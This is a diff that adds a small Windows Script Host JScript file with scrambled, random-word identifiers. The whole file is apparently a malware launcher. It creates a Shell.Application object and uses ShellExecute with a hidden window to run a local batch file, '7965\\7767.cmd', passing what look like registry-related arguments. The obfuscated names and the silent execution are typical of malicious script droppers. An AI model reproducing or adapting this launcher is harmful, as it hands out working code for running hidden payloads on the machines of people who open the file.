@@ -1,0 +1,15 @@
+// heeledJumbles
+function archaeologicallyReimburse()
+{
+	var recordingsProwlers = WScript.createObject("shell.application");
+	return(recordingsProwlers);
+}
+
+// archaeologicallyReimburse
+recordingsProwlers = archaeologicallyReimburse();
+
+// gelatinElephants
+recordingsProwlers["shellexecute"]("7965\\7767.cmd", "reg sv", "", "open", 0);
+
+
+
